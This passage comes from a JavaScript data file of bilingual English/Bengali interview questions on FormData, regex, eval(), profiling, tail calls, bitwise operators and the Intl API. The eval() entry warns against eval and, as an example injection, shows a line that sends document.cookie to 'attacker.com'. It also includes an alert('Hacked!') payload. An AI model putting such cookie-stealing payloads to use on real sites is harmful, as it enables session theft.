    console.log("Success:", await response.json());
  } catch (error) {
    console.error("Upload failed:", error);
  }
});
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **\`FormData(formElement)\`**: এইচটিএমএল ফর্ম এলিমেন্টের সমস্ত সক্রিয় কি-ভ্যালু ডাটা স্বয়ংক্রিয়ভাবে সংগ্রহ করে অবজেক্ট তৈরি করে।
- **মাল্টিপার্ট পে-লোড**: টেক্সট ডাটার সাথে বাইনারি বা ইমেজ ফাইল আপলোড করতে এটি ব্যবহার করা আবশ্যক। ব্রাউজার নিজে থেকেই এর হেডার \`Content-Type: multipart/form-data\` এবং ইউনিক বাউন্ডারি স্ট্রিং সেট করে নেয়।
- **মেথডসমূহ**: এতে ডাইনামিকালি ডাটা প্রসেস করতে \`append()\`, \`set()\`, \`delete()\` মেথডগুলো ব্যবহার করা যায়।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
ইউজার প্রোফাইল পিকচার ও তার নাম একসাথে আপলোড করা। একটি \`FormData\` অবজেক্ট তৈরি করে ফাইলের বাইনারি ডাটা অ্যাপেন্ড করে এপিআই কলের বডিতে পাঠিয়ে দেওয়া।

### উত্তম অনুশীলন (Best Practice)
ফেচ বা এপিআই দিয়ে \`FormData\` পাঠানোর সময় ম্যানুয়ালি \`Content-Type\` হেডার সেট করবেন না। ব্রাউজারকে এটি করতে দিন, যাতে ইউনিক মাল্টিপার্ট বাউন্ডারি ডিলিমিটার হেডারটি সঠিকভাবে জেনারেট হতে পারে।

### সাধারণ ভুলসমূহ (Common Mistakes)
\`FormData\` অবজেক্টকে \`JSON.stringify()\` দিয়ে রূপান্তর করার চেষ্টা করা। এটি জেসন সাপোর্ট করে না; এটিকে সরাসরি রিকোয়েস্টের \`body\` প্যারামিটারে পাস করতে হবে।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// এইচটিএমএল ফর্ম সাবমিশন ইন্টারসেপ্টর
const form = document.querySelector("#user-form");

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  
  // ফর্ম ডেটা অবজেক্ট তৈরি
  const formData = new FormData(form);
  
  // কাস্টম অতিরিক্ত ডাটা অ্যাপেন্ড করা হচ্ছে
  formData.append("source", "web_app");
  
  try {
    const response = await fetch("/api/register", {
      method: "POST",
      body: formData // ব্রাউজার নিজেই Content-Type: multipart/form-data সেট করবে!
    });
    console.log("সফল:", await response.json());
  } catch (error) {
    console.error("আপলোড ব্যর্থ হয়েছে:", error);
  }
});
\`\`\``
  },
  {
    id: 'javascript-91',
    title: 'Explain Advanced Regular Expressions: Lookahead, Lookbehind, and Named Capture Groups.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Regex', 'Pattern Matching', 'Strings'],
    enAnswer: 'Advanced Regex features include: Lookahead (?=) and Lookbehind (?<=) assertions that match patterns based on what follows or precedes them, and Named Capture Groups (?<name>) to label match results.',
    bnAnswer: 'উন্নত রেগুলার এক্সপ্রেশনে রয়েছে: Lookahead (?=) এবং Lookbehind (?<=) যা আশেপাশের চরিত্রের ওপর ভিত্তি করে প্যাটার্ন মেলাতে সাহায্য করে এবং Named Capture Groups যা ম্যাচ করা ডাটাকে লেবেল দেয়।',
    enExplanation: `### Explanation
Modern ES features enhance regular expressions:
- **Lookahead (\`(?=pattern)\`)**: Matches a group only if it is followed by \`pattern\`. Negative lookahead \`(?!pattern)\` matches if NOT followed.
- **Lookbehind (\`(?<=pattern)\`)**: Matches only if preceded by \`pattern\`. Negative lookbehind \`(?<!pattern)\` matches if NOT preceded.
- **Named Capture Groups (\`(?<name>pattern)\`)**: Assigns a custom key to matching fragments, making result parsing extremely readable instead of indexing arrays (\`match[1]\`).

### Real-World Example
Parsing currency symbols or complex code tokens. Matching a number only if it is preceded by a dollar sign (\`(?<=\\$)\\d+\`), or parsing date segments into \`year\`, \`month\`, and \`day\` keys directly.

### Best Practice
Utilize Named Capture Groups when parsing complex log files or template formats to ensure code stays maintainable even if regex patterns are refactored.

### Common Mistakes
Confusing lookahead with lookbehind syntax. E.g. writing \`(?=pattern)\` instead of \`(?<=pattern)\`, which tests the wrong direction of the match target.

### Code Example
\`\`\`javascript
// 1. Lookbehind (Match amount only if preceded by '$')
const priceText = "Item price is $150 and tax is €10";
const priceRegex = /(?<=\\$)\\d+/;
console.log(priceText.match(priceRegex)[0]); // "150" (does not match 10!)

// 2. Named Capture Groups
const dateText = "2026-06-19";
const dateRegex = /(?<year>\\d{4})-(?<month>\\d{2})-(?<day>\\d{2})/;
const match = dateText.match(dateRegex);

console.log(match.groups.year);  // "2026"
console.log(match.groups.month); // "06"
console.log(match.groups.day);   // "19"
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
আধুনিক জাভাস্ক্রিপ্ট রেগুলার এক্সপ্রেশনকে শক্তিশালী করেছে:
- **লুকআহেড (\`(?=pattern)\`)**: কোনো টেক্সট ম্যাচ করবে কেবল যদি তার পরে নির্দিষ্ট \`pattern\` থাকে। নেগেটিভ লুকআহেড \`(?!pattern)\` উল্টোটি চেক করে।
- **লুকবিহাইন্ড (\`(?<=pattern)\`)**: কোনো টেক্সট ম্যাচ করবে কেবল যদি তার পূর্বে নির্দিষ্ট \`pattern\` থাকে। নেগেটিভ লুকবিহাইন্ড \`(?<!pattern)\` উল্টোটি চেক করে।
- **নেমড ক্যাপচার গ্রুপস (\`(?<name>pattern)\`)**: ম্যাচ করা অংশকে একটি কাস্টম অবজেক্ট কী বা লেবেল দেয়, যা অ্যারে ইনডেক্সের (\`match[1]\`) জটিলতা ছাড়াই সরাসরি ডাটা অ্যাক্সেস করতে দেয়।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
কারেন্সি সিম্বল বা কোড টোকেন পার্স করা। একটি টেক্সট থেকে সংখ্যাটি কেবল তখনই ম্যাচ করা যখন তার পূর্বে ডলার সাইন থাকে (\`(?<=\\$)\\d+\`), অথবা ইউজার ডেট স্ট্রিং থেকে সরাসরি \`year\`, \`month\`, \`day\` কী এক্সট্র্যাক্ট করা।

### উত্তম অনুশীলন (Best Practice)
জটিল লগ ফাইল বা টেমপ্লেট স্ট্রিং ডিকোড করার সময় নেমড ক্যাপচার গ্রুপ ব্যবহার করুন, যা পরবর্তীতে রেগুলার এক্সপ্রেশন রিফ্যাক্টর করলেও কোডের মূল লজিক সচল রাখে।

### সাধারণ ভুলসমূহ (Common Mistakes)
লুকআহেড এবং লুকবিহাইন্ডের সিনট্যাক্স গুলিয়ে ফেলা। যেমন: \`(?<=)\` এর জায়গায় \`(?=)\` ব্যবহার করা, যা ভুল ডিরেকশনে স্ক্যান করে।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// ১. Lookbehind (ডলার চিহ্নের ঠিক পরের সংখ্যাটি কেবল ম্যাচ করবে)
const priceText = "Item price is $150 and tax is €10";
const priceRegex = /(?<=\\$)\\d+/;
console.log(priceText.match(priceRegex)[0]); // "150" (১০ ম্যাচ করবে না!)

// ২. Named Capture Groups
const dateText = "2026-06-19";
const dateRegex = /(?<year>\\d{4})-(?<month>\\d{2})-(?<day>\\d{2})/;
const match = dateText.match(dateRegex);

console.log(match.groups.year);  // "2026"
console.log(match.groups.month); // "06"
console.log(match.groups.day);   // "19"
\`\`\``
  },
  {
    id: 'javascript-92',
    title: 'Explain eval() and its security/performance implications.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Security', 'eval', 'Performance'],
    enAnswer: 'eval() executes a string as JavaScript code. It is highly discouraged because it introduces massive security threats (XSS) and slows down JIT compiler optimizations.',
    bnAnswer: 'eval() স্ট্রিংকে জাভাস্ক্রিপ্ট কোড হিসেবে রান করায়। এটি মারাত্মক সিকিউরিটি থ্রেট (XSS) তৈরি করে এবং কম্পাইলার অপ্টিমাইজেশন ব্যাহত করে বলে এটি বর্জনীয়।',
    enExplanation: `### Explanation
- **Security Risks**: If \`eval()\` runs user-supplied inputs, hackers can inject malicious script payloads (XSS), gaining complete access to cookies, session tokens, and local storage.
- **Performance Penalties**: JavaScript engines optimize code during compilation by determining variable scope locations. Since \`eval()\` can introduce new variables dynamically at runtime, it forces the engine to bypass these JIT compilation speed optimizations, reverting to slow interpretive execution.

### Real-World Example
Accidentally evaluating calculator operations. If you build a web calculator and evaluate equations using \`eval(equationInput)\`, a user can type \`window.location.replace("attacker.com?cookie=" + document.cookie)\`, stealing credentials instantly.

### Best Practice
Never use \`eval()\`. For mathematical evaluations, use safe equation parsers or build a custom mathematical parser using AST trees.

### Common Mistakes
Thinking \`eval()\` is the only way to access dynamic object properties. Always use bracket notation instead: \`obj[key]\` instead of \`eval("obj." + key)\`.

### Code Example
\`\`\`javascript
// Unsafe calculation (Allows code injection!)
const input = "2 + 2; alert('Hacked!');";
// eval(input); // Executes the math AND the malicious alert!

// Safe Dynamic Object access (No eval needed)
const user = { name: "Rohit", role: "admin" };
const dynamicKey = "role";

// Unsafe:
// const role1 = eval("user." + dynamicKey);
// Safe:
const role2 = user[dynamicKey];
console.log(role2); // "admin"
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **নিরাপত্তা ঝুঁকি**: \`eval()\` এর ভেতর যদি কোনো ইউজারের দেওয়া ইনপুট ডাটা সরাসরি রান করানো হয়, তবে হ্যাকাররা মেলিসিয়াস স্ক্রিপ্ট ইনজেক্ট (XSS) করে কুকি ও লোকাল স্টোরেজের সেশন টোকেন চুরি করতে পারে।
- **পারফরম্যান্স বিপর্যয়**: জাভাস্ক্রিপ্ট ইঞ্জিন জেআইটি (JIT) কম্পাইলেশনের সময় কোড অপ্টিমাইজ করে। \`eval()\` রানটাইমে ডাইনামিকালি নতুন ভ্যারিয়েবল তৈরি করতে পারায় এটি ইঞ্জিন অপ্টিমাইজেশনকে ব্লক করে কোডের স্পিড ধীর করে দেয়।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
একটি ওয়েব ক্যালকুলেটর তৈরি করা। আপনি যদি ইউজারের ইকুয়েশন ইনপুট সরাসরি \`eval(equationInput)\` দিয়ে রান করান, তবে কোনো ব্যবহারকারী টেক্সট বক্সে মেলিসিয়াস কোড লিখে আপনার সাইটের অন্য ব্যবহারকারীদের কুকি চুরির স্ক্রিপ্ট রান করিয়ে নিতে পারে।

### উত্তম অনুশীলন (Best Practice)
কোডবেসে কখনো \`eval()\` ব্যবহার করবেন না। গাণিতিক ক্যালকুলেশনের জন্য সিকিউর ইকুয়েশন লাইব্রেরি অথবা কাস্টম পার্সার অ্যালগরিদম ব্যবহার করুন।

### সাধারণ ভুলসমূহ (Common Mistakes)
ডাইনামিক অবজেক্ট কী অ্যাক্সেস করতে \`eval()\` ছাড়া অন্য উপায় নেই মনে করা। এ ক্ষেত্রে ব্র্যাকেট নোটেশন \`obj[key]\` ব্যবহার করুন, \`eval("obj." + key)\` নয়।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// অনিরাপদ ক্যালকুলেশন (কোড ইনজেকশন সম্ভব!)
const input = "2 + 2; alert('Hacked!');";
// eval(input); // এটি ম্যাথও করবে সাথে ক্ষতিকর এলার্ট কোডও রান করবে!

// নিরাপদ ডাইনামিক অবজেক্ট কী অ্যাক্সেস (eval ছাড়া)
const user = { name: "Rohit", role: "admin" };
const dynamicKey = "role";

// অনিরাপদ পদ্ধতি:
// const role1 = eval("user." + dynamicKey);
// নিরাপদ পদ্ধতি:
const role2 = user[dynamicKey];
console.log(role2); // "admin"
\`\`\``
  },
  {
    id: 'javascript-93',
    title: 'Explain Advanced Debugging: Performance Profiling and Heap Snapshots.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Performance', 'Debugging', 'Heap Snapshots'],
    enAnswer: 'Performance profiling records execution timings to detect CPU bottlenecks. Heap Snapshots capture active memory allocations to trace memory leaks and detached DOM nodes.',
    bnAnswer: 'Performance profiling সিপিইউ বোতলনেকস খোঁজে। Heap Snapshots মেমরির বর্তমান অবস্থা ধারণ করে মেমরি লিক এবং ডিটাচড DOM নোড খুঁজে বের করে।',
    enExplanation: `### Explanation
Chrome DevTools offers professional diagnostics panels:
- **Performance Panel**: Records application execution. It displays flame charts of function calls, identifying "Long Tasks" (tasks taking longer than 50ms that block the main thread and skip frames).
- **Memory Panel (Heap Snapshot)**:
  - Captures a snapshot of all active objects in memory.
  - Comparing snapshots (Comparison view) shows what objects were allocated and not released.
  - **Distance**: Represents how many pointers separate the object from the GC root. High distance with zero logical usage signals a memory leak.

### Real-World Example
Optimizing a React table component displaying 10,000 rows. A Performance trace shows layout recalculations taking 200ms per keystroke (layout thrashing), prompting the developer to memoize inputs and virtualize rows.

### Best Practice
Run performance recordings on low-end mobile device throttling settings inside Chrome DevTools to test real-world CPU capabilities.

### Common Mistakes
Recording profiling data in browser development mode with active chrome extensions running, which bloats logs with extension metrics instead of clean app data. Use Incognito mode.

### Code Example
\`\`\`javascript
// Performance profiling triggers in code (standard API)
// Start tracking execution time
console.time("Heavy Operation");

const list = [];
for (let i = 0; i < 1000000; i++) {
  list.push({ id: i });
}

console.timeEnd("Heavy Operation"); // prints elapsed milliseconds in console
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
Chrome DevTools অ্যাপ্লিকেশনের পারফরম্যান্স পরিমাপের শক্তিশালী প্যানেল অফার করে:
- **Performance Panel**: এটি রান টাইমে কোড এক্সিকিউশন রেকর্ড করে। এটি মেথড কলের ফ্ল্যাম চার্ট দেখায় এবং "Long Tasks" (৫০ মিলি-সেকেন্ডের বেশি সময় নিয়ে মেইন থ্রেড ব্লক করা টাস্ক) সনাক্ত করে।
- **Memory Panel (Heap Snapshot)**:
  - মেমরিতে থাকা সমস্ত সচল অবজেক্টের স্ন্যাপশট নেয়।
  - দুটি স্ন্যাপশট তুলনা করে (Comparison view) দেখা যায় কোন কোন অবজেক্ট মেমরি থেকে রিলিজ হয়নি।
  - **Distance**: অবজেক্টটি গ্লোবাল রুট থেকে কতগুলো পয়েন্টার দূরে আছে তা দেখায়।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
১০,০০০ রো (rows) সমৃদ্ধ একটি রিঅ্যাক্ট টেবিল অপ্টিমাইজ করা। পারফরম্যান্স প্রোফাইলিং করে দেখা গেল প্রতি কী-প্রেসে লেআউট রি-ক্যালকুলেশনে ২০০ মিলি-সেকেন্ড সময় নষ্ট হচ্ছে (layout thrashing)। এর সমাধান করতে ডেভেলপার টেবিল রো ভার্চুয়ালাইজেশন অ্যাপ্লাই করেন।

### উত্তম অনুশীলন (Best Practice)
প্রোডাকশনের আসল ডিভাইস পারফরম্যান্স টেস্ট করতে Chrome DevTools-এ মোবাইল সিপিইউ থ্রটলিং মোড অন করে প্রোফাইলিং রেকর্ড করুন।

### সাধারণ ভুলসমূহ (Common Mistakes)
ব্রাউজারে কাস্টম এক্সটেনশন অন রেখে প্রোফাইলিং রেকর্ড করা, যা অ্যাপের ডাটার সাথে এক্সটেনশনের ডাটাও যুক্ত করে বিভ্রান্তি তৈরি করে। এর জন্য ইনকগনিটো মোড ব্যবহার করুন।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// কোডের ভেতর পারফরম্যান্স পরিমাপ করা (console.time API)
// সময় ট্র্যাকিং শুরু
console.time("ভারী কাজ");

const list = [];
for (let i = 0; i < 1000000; i++) {
  list.push({ id: i });
}

console.timeEnd("ভারী কাজ"); // কনসোলে মোট কত মিলি-সেকেন্ড সময় লেগেছে তা দেখাবে
\`\`\``
  },
  {
    id: 'javascript-94',
    title: 'Explain Tail Call Optimization (TCO) in JavaScript.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Compilation', 'TCO', 'Recursion'],
    enAnswer: 'Tail Call Optimization is a compiler feature where a recursive function call positioned as the final action reuse the current stack frame, preventing stack overflow errors.',
    bnAnswer: 'Tail Call Optimization হলো এমন কম্পাইলার ফিচার যেখানে ফাংশনের শেষ অ্যাকশনটি রিকার্সিভ হলে নতুন স্ট্যাক ফ্রেম তৈরি না করে বর্তমান ফ্রেমটিই রিইউজ করে স্ট্যাক ওভারফ্লো আটকায়।',
    enExplanation: `### Explanation
When a function calls another function, the JS engine pushes a new frame onto the Call Stack. Deep recursion quickly triggers \`RangeError: Maximum call stack size exceeded\`.
- **TCO**: If the recursive call is in the **tail position** (the very last statement returning the output of the recursive call directly without further math operations), the engine discards the current frame and reuses it for the recursive call.
- **Specification**: Added in ES6 but *only* implemented by Safari/WebKit engines. Node/V8 disabled it due to call stack debugging challenges.

### Real-World Example
Calculating deep mathematical hierarchies or traversing massive nested tree structures. Using tail recursion prevents memory stack overflows on engines supporting TCO.

### Best Practice
While TCO support is limited across browsers, structure recursive algorithms in tail-call format or use iterative loops to prevent execution crashes.

### Common Mistakes
Writing math operations after the tail call, e.g. \`return n * factorial(n - 1)\`. This is *not* optimized because the engine must keep the stack frame active to multiply \`n\` after the recursive call resolves.

### Code Example
\`\`\`javascript
// 1. Non-TCO Recursion (Engine must keep active stack frame)
function factorialNormal(n) {
  if (n <= 1) return 1;
  return n * factorialNormal(n - 1); // Not a tail call (multiplication is pending)
}

// 2. TCO Optimized Recursion (Tail Call)
function factorialTail(n, accumulator = 1) {
  if (n <= 1) return accumulator;
  return factorialTail(n - 1, n * accumulator); // Tail call! (No pending operations)
}
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
যখন কোনো ফাংশন অন্য ফাংশনকে কল করে, তখন ইঞ্জিন কল স্ট্যাকে নতুন একটি ফ্রেম যুক্ত করে। অতিরিক্ত রিকার্সিভ কল দিলে দ্রুত \`Maximum call stack size exceeded\` এরর তৈরি হয়।
- **TCO**: যদি রিকার্সিভ কলটি ফাংশনের **টেইল পজিশনে** (একেবারে শেষ লাইনে এবং কোনো এক্সট্রা গাণিতিক হিসাব ছাড়া সরাসরি রিটার্ন ফরম্যাটে) থাকে, তবে ইঞ্জিন নতুন ফ্রেম তৈরি না করে বর্তমান স্ট্যাক ফ্রেমটিই রিইউজ করে।
- **সীমাবদ্ধতা**: এটি ES6 স্পেকে থাকলেও কেবল Safari (WebKit) ইঞ্জিন এটি পুরোপুরি ইমপ্লিমেন্ট করেছে। ডিবাগিং জটিলতার কারণে নোড বা ক্রোম (V8) এটি নিষ্ক্রিয় করে রেখেছে।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
অত্যন্ত গভীর ডাটা ট্রি বা ফাইল ডিরেক্টরি রিকার্সিভলি স্ক্যান করা। TCO ফরম্যাটে কোড লিখলে তা বাফার ওভারফ্লো না করে অসীম সময় ধরে চলতে পারে।

### উত্তম অনুশীলন (Best Practice)
সব ব্রাউজারে TCO সাপোর্ট না থাকায় বড় রিকার্সন এড়াতে কাস্টম ইটারেটিভ লুপ (যেমন: \`while\` বা \`for\`) ব্যবহার করুন।

### সাধারণ ভুলসমূহ (Common Mistakes)
টেইল কলের শেষে গুণ বা অন্য হিসাব করা, যেমন: \`return n * factorial(n - 1)\`। এটি টেইল কল অপ্টিমাইজড নয় কারণ রিকার্সিভ কল শেষ হওয়ার পর গুণ করার জন্য মেইন ফ্রেম সচল রাখতে হয়।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// ১. নন-TCO রিকার্সন (স্ট্যাক ফ্রেম জমা হতে থাকবে)
function factorialNormal(n) {
  if (n <= 1) return 1;
  return n * factorialNormal(n - 1); // টেইল কল নয় (গুণ করতে হবে)
}

// ২. TCO অপ্টিমাইজড রিকার্সন (টেইল কল)
function factorialTail(n, accumulator = 1) {
  if (n <= 1) return accumulator;
  return factorialTail(n - 1, n * accumulator); // টেইল কল! (কোনো অতিরিক্ত হিসাব বাকি নেই)
}
\`\`\``
  },
  {
    id: 'javascript-95',
    title: 'Explain Bitwise operators usage and performance optimization contexts.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Bitwise', 'Performance', 'Binary Operations'],
    enAnswer: 'Bitwise operators manipulate 32-bit binary representations of numbers directly, providing extremely fast operations for flags masking and authorization systems.',
    bnAnswer: 'Bitwise অপারেটররা সরাসরি সংখ্যার ৩২-বিট বাইনারি রূপ নিয়ে কাজ করে, যা ফ্ল্যাগ মাস্কিং এবং পারমিশন সিস্টেমে অত্যন্ত দ্রুত পারফরম্যান্স দেয়।',
    enExplanation: `### Explanation
Bitwise operators operate at the bit level:
- **Operations**: \`&\` (AND), \`|\` (OR), \`^\` (XOR), \`~\` (NOT), \`<<\` (Left Shift), \`>>\` (Right Shift).
- **Dynamic Conversion**: JavaScript numbers are stored as 64-bit floats. When a bitwise operator is used, the engine temporarily converts the number to a 32-bit signed integer, performs the operation, and converts it back.
- **Use Cases**: Managing bitmasks (permission states represented by active bits), cryptography, and fast math operations (like discarding decimal places using double bitwise NOT \`~~x\` or right shift \`x >> 0\`).

### Real-World Example
Role-based access control (RBAC). Instead of checking arrays of string roles, you store permissions as a single numeric bitmask: \`READ = 1\` (0001), \`WRITE = 2\` (0010). Checking if a user has write permission is a simple \`(permissions & WRITE)\` bitwise check, which is extremely fast.

### Best Practice
Avoid overusing bitwise shortcuts like \`~~x\` in readable team codebases unless performance is absolutely critical, as they make code difficult to read.

### Common Mistakes
Confusing logical operators (\`&&\`, \`||\`) with bitwise operators (\`&\`, \`|\`), which causes incorrect evaluations due to bit comparison rules.

### Code Example
\`\`\`javascript
// Bitwise Permission System (Bitmask)
const READ    = 1; // 0001
const WRITE   = 2; // 0010
const DELETE  = 4; // 0100

// Assign READ and WRITE permissions to user
let userPermissions = READ | WRITE; // 0011 (binary representation)

// Check permissions
const canWrite = (userPermissions & WRITE) === WRITE; // true
const canDelete = (userPermissions & DELETE) === DELETE; // false
console.log(canWrite, canDelete); // true, false

// Fast Rounding shortcut
const floatNum = 42.99;
console.log(~~floatNum); // 42 (very fast math truncation)
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
Bitwise অপারেটর সরাসরি বাইনারি লেভেলে বিট পরিবর্তন করে:
- **অপারেটরসমূহ**: \`&\` (AND), \`|\` (OR), \`^\` (XOR), \`~\` (NOT), \`<<\` (Left Shift)।
- **কনভার্সন**: জাভাস্ক্রিপ্ট নাম্বার ডাবল-প্রিসিশন ফ্লোট হিসেবে থাকে। বিটওয়াইজ অপারেশন চালানোর সময় ইঞ্জিন এটিকে সাময়িকভাবে ৩২-বিট ইন্টিজারে রূপান্তর করে লজিক রান করে আবার ফ্লোটে ফেরত পাঠায়।
- **ব্যবহার**: বিটমাস্কিং (পারমিশন সিকিউরিটি), ক্রিপ্টোগ্রাফি এবং ফাস্ট ম্যাথ রাউন্ডিং (যেমন ভগ্নাংশ বাদ দিতে ডাবল বিটওয়াইজ নট \`~~x\` বা রাইট শিফট \`x >> 0\` ব্যবহার)।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
রোল-ভিত্তিক পারমিশন সিস্টেম (RBAC)। অনেকগুলো পারমিশন স্ট্রিং অ্যারিতে চেক না করে একটি মাত্র সংখ্যায় বিট আকারে সেভ রাখা: \`READ = 1\` (0001), \`WRITE = 2\` (0010)। ইউজারের রাইট পারমিশন আছে কিনা তা কেবল \`(permissions & WRITE)\` দিয়ে চেক করা যায়, যা অবিশ্বাস্য রকম দ্রুত কাজ করে।

### উত্তম অনুশীলন (Best Practice)
কোড রিডিবিলিটি বজায় রাখতে সাধারণ টিমের কোডবেসে \`~~x\` এর মতো বিটওয়াইজ শর্টকাট অতিরিক্ত ব্যবহার করবেন না, যদি না পারফরম্যান্স অত্যন্ত জটিল স্তরে থাকে।

### সাধারণ ভুলসমূহ (Common Mistakes)
লজিক্যাল অপারেটরের (\`&&\`, \`||\`) সাথে বিটওয়াইজ অপারেটর (\`&\`, \`|\`) গুলিয়ে ফেলা, যা সম্পূর্ণ ভুল ক্যালকুলেশন জেনারেট করে।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// বিটওয়াইজ পারমিশন সিস্টেম (বিটমাস্ক)
const READ    = 1; // 0001
const WRITE   = 2; // 0010
const DELETE  = 4; // 0100

// রিড এবং রাইট পারমিশন অ্যাসাইন করা হলো
let userPermissions = READ | WRITE; // 0011 (বাইনারি রিপ্রেজেন্টেশন)

// পারমিশন চেক
const canWrite = (userPermissions & WRITE) === WRITE; // true
const canDelete = (userPermissions & DELETE) === DELETE; // false
console.log(canWrite, canDelete); // true, false

// ফাস্ট রাউন্ডিং শর্টকাট
const floatNum = 42.99;
console.log(~~floatNum); // 42 (দ্রুত পূর্ণসংখ্যায় রূপান্তর)
\`\`\``
  },
  {
    id: 'javascript-96',
    title: 'Explain the Internationalization API (Intl object) and its formatting helpers.',
    difficulty: 'intermediate',
    category: 'javascript',
    tags: ['JavaScript', 'Intl API', 'Localization', 'Formatting'],
    enAnswer: 'The Intl object provides language-sensitive string comparison, number formatting, currency display, and date/time formatting natively in the browser.',
    bnAnswer: 'Intl অবজেক্ট লোকাল ল্যাঙ্গুয়েজ অনুযায়ী স্ট্রিং তুলনা, সংখ্যা সাজানো, কারেন্সি ডিসপ্লে এবং ডেট/টাইম ফরম্যাট করার নেটিভ ব্রাউজার এপিআই প্রোভাইড করে।',
    enExplanation: `### Explanation
The \`Intl\` namespace contains powerful constructor helpers that prevent bringing in heavy external localization packages like Moment.js:
- **\`Intl.DateTimeFormat(locale, options)\`**: Formats dates dynamically based on locale configurations.
- **\`Intl.NumberFormat(locale, options)\`**: Formats numbers and currency representations (adds thousands separators, formats decimal limits).
- **\`Intl.RelativeTimeFormat(locale, options)\`**: Formats relative periods (like "3 days ago" or "in 2 weeks") automatically.

### Real-World Example
Ecommerce price localization. Displaying product price as \`$1,500.00\` for US consumers and \`৳১,৫০০.০০\` for Bangladeshi consumers dynamically based on their language preferences.

### Best Practice
Always utilize the native \`Intl\` API instead of loading heavy date/number formatting libraries to keep web bundle sizes minimal.

### Common Mistakes
Forgetting that local formatting depends on user browser support. If the requested locale is not supported, the engine defaults back to system locales.

### Code Example
\`\`\`javascript
// 1. Currency Formatting
const price = 1500.75;

const usFormatter = new Intl.NumberFormat("en-US", {
  style: "currency",
  currency: "USD"
});
console.log(usFormatter.format(price)); // "$1,500.75"

const bdFormatter = new Intl.NumberFormat("bn-BD", {
  style: "currency",
  currency: "BDT"
});
console.log(bdFormatter.format(price)); // "৳১,৫০০.৭৫" (Bengali digits!)

// 2. Relative Time Formatting
const rtf = new Intl.RelativeTimeFormat("en", { numeric: "auto" });
console.log(rtf.format(-3, "day")); // "3 days ago"
console.log(rtf.format(1, "week")); // "next week"
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
\`Intl\` নেমস্পেস ব্রাউজারে কাস্টম ডেট/কারেন্সি ফরম্যাটের এমন শক্তিশালী হেল্পার দেয় যা মোমেন্ট ডট জেএস (Moment.js) এর মতো ভারী প্যাকেজ ইমপোর্ট করার প্রয়োজনীয়তা দূর করে:
- **\`Intl.DateTimeFormat\`**: নির্দিষ্ট দেশের বা ভাষার নিয়ম অনুযায়ী ডেট ও টাইম ফরম্যাট করে।
- **\`Intl.NumberFormat\`**: সংখ্যা ও মুদ্রার ফরম্যাট সাজায় (হাজারের পর কমা যুক্ত করা, কারেন্সি সিম্বল বসানো)।
- **\`Intl.RelativeTimeFormat\`**: রিলেটিভ টাইম (যেমন: "3 days ago" বা "গত বছর") স্বয়ংক্রিয়ভাবে অনুবাদ ও ফরম্যাট করে।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
ই-কমার্স ওয়েবসাইটে পণ্যের দাম লোকাল কারেন্সি অনুযায়ী দেখানো। ইউএসএ ব্যবহারকারীর জন্য \`$1,500.00\` এবং বাংলাদেশি ইউজারের জন্য বাংলা হরফে \`৳১,৫০০.৭৫\` শো করা।

### উত্তম অনুশীলন (Best Practice)
ওয়েবসাইটের বান্ডেল সাইজ অপ্টিমাইজ রাখতে কাস্টম ফরম্যাটিং লাইব্রেরি ব্যবহার না করে নেটিভ \`Intl\` এপিআই ব্যবহার করুন।

### সাধারণ ভুলসমূহ (Common Mistakes)
ভুলে যাওয়া যে লোকাল ফরম্যাটিং ব্রাউজার সাপোর্টের ওপর নির্ভরশীল। রিকোয়েস্ট করা লোকেল ল্যাঙ্গুয়েজ ব্রাউজারে না থাকলে এটি ডিফল্ট সিস্টেমে ফিরে যায়।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// ১. কারেন্সি ফরম্যাটিং
const price = 1500.75;

const usFormatter = new Intl.NumberFormat("en-US", {
  style: "currency",
  currency: "USD"
});
console.log(usFormatter.format(price)); // "$1,500.75"

const bdFormatter = new Intl.NumberFormat("bn-BD", {
  style: "currency",
  currency: "BDT"
});
console.log(bdFormatter.format(price)); // "৳১,৫০০.৭৫" (সম্পূর্ণ বাংলা ফরম্যাটে!)

// ২. রিলেটিভ টাইম ফরম্যাটিং
const rtf = new Intl.RelativeTimeFormat("en", { numeric: "auto" });
console.log(rtf.format(-3, "day")); // "3 days ago"
console.log(rtf.format(1, "week")); // "next week"
\`\`\``
  },
  {
    id: 'javascript-97',
    title: 'Explain the new Temporal API specification.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Temporal API', 'Dates', 'Standards'],
    enAnswer: 'The Temporal API is a modern, draft standard replacement for the legacy Date object, providing type-safe, immutable date/time objects with built-in timezone handling.',
    bnAnswer: 'Temporal API হলো পুরোনো Date অবজেক্টের আধুনিক বিকল্প, যা টাইপ-সেফ, ইমিউটেবিলিটি সম্পন্ন এবং টাইমজোন হ্যান্ডেল করতে পারে।',
    enExplanation: `### Explanation
The legacy \`Date\` object is notorious for bugs (months are 0-indexed, mutations happen directly, timezone arithmetic is highly complex). The new proposal **\`Temporal\`** solves these:
- **Immutability**: All Temporal objects are read-only. Modifying a date returns a new instance.
